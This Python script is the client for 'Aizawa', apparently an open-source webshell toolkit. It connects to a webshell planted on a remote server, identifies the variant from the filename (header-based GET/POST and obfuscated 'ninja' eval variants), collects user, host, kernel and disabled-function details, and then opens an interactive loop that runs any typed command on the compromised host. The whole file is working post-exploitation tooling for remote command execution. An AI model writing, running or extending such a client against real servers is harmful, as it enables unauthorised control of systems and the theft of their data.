#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

import re
import sys
import httpx
import asyncio
import validators
from modules.utils.colors import *
from modules.execute import execute
from modules.utils.banner import banner

async def main():
    # Httpx Client

    async with httpx.AsyncClient(verify=False, http2=True, timeout=None) as client:
        # Get URL and check if valid

        url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
        if not validators.url(url):
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": Invalid URL format\n"
                + "This does not appear to be a valid URL/IP address\n"
                + "Please check the input and try again\n"
            ))

        # Remove any characters after the file extension

        regex = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
        remove_char = regex.findall(url)
        url = remove_char[0]

        # Check if URL is alive and reachable

        await execute(client, url, "", "ping")

        # Get filename and strip the domain

        filename = url[url.rfind("/") + 1 :]

        # Classify the webshell type based on the filename

        patterns_to_types = {
            r"get_aizawa_hal_(.*?)\.": "http_accept_language_get",
            r"get_aizawa_hua_(.*?)\.": "http_user_agent_get",
            r"post_aizawa_hal_(.*?)\.": "http_accept_language_post",
            r"post_aizawa_hua_(.*?)\.": "http_user_agent_post",
            r"aizawa_ninja_eval_(.*?)\.": "http_aizawa_ninja_eval",
            r"aizawa_ninja_concat_(.*?)\.": "http_aizawa_ninja_concat",
            r"aizawa_ninja_debug_(.*?)\.": "http_aizawa_ninja_debug",
            r"aizawa_ninja_gc_(.*?)\.": "http_aizawa_ninja_gc",
            r"aizawa_ninja_json_(.*?)\.": "http_aizawa_ninja_json",
            r"aizawa_ninja_filter_(.*?)\.": "http_aizawa_ninja_filter",
        }

        type = None

        for pattern, t in patterns_to_types.items():
            match = re.findall(pattern, filename)
            if match:
                type = t
                break

        if type is None:
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": Invalid filename\n"
                + "This does not appear to be a valid Aizawa Webshell\n"
                + "Please check the URL and try again\n"
            ))

        # Get essential information

        # Get user and host

        user = await execute(client, url, "whoami", type)
        host = await execute(client, url, "hostname", type)
        pwd = await execute(client, url, "pwd", type)

        # Return default values if not found or error

        user = (
            "aizawaema"
            if not user or user == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", user)
        )
        host = (
            "virtualesport"
            if not host or host == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", host)
        )
        pwd = (
            "~/unknown/path"
            if not pwd or pwd == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", pwd)
        )

        # Print essential information
        if type in [
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
            "http_aizawa_ninja_eval",
        ]:
            print(
                BOLD
                + GREEN
                + "Successfully connected to Aizawa Webshell Ninja Edition!"
                + CLEAR
            )
        else:
            print(
                BOLD
                + GREEN
                + "Successfully connected to Aizawa Webshell!"
                + CLEAR
                + "\n"
            )

            info_commands = {
                "Kernel": "unamea",
                "Server": "server",
                "Safe Mode": "safe_mode",
                "Server IP": "server_ip",
                "Client IP": "client_ip",
                "Disable Function": "disable_functions",
            }

            if type in ["http_accept_language_post", "http_user_agent_post"]:
                method = "post"
            elif type in ["http_accept_language_get", "http_user_agent_get"]:
                method = "get"

            # Calculate the maximum label width
            max_label_width = max(len(label) for label in info_commands.keys())

            for info, command in info_commands.items():
                if method == "get":
                    result = await execute(client, url, f"?{command}", method)
                elif method == "post":
                    result = await execute(client, url, f"{command}", method)
                formatted_info = f"{info.ljust(max_label_width)} : {result}"
                print(f"{BOLD}{formatted_info}{CLEAR}")

        # Initialize the shell

        while True:
            # Get command from user

            cmd = input(
                "\n"
                + BOLD
                + YELLOW
                + user
                + CLEAR
                + "@"
                + BOLD
                + BLUE
                + host
                + CLEAR
                + " "
                + PURPLE
                + pwd
                + CLEAR
                + " % "
            )
            if cmd == "exit" or cmd == "quit" or cmd == "\x03":
                sys.exit(print(BOLD + RED + "Exiting..." + CLEAR))
            if not cmd:
                continue

            # Execute command and print result

            print("\n" + CYAN + await execute(client, url, cmd, type) + CLEAR)

if __name__ == "__main__":
    # Print banner
    banner()

    # Run the script
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + BOLD + RED + "Ctrl + C detected. Exiting..." + CLEAR)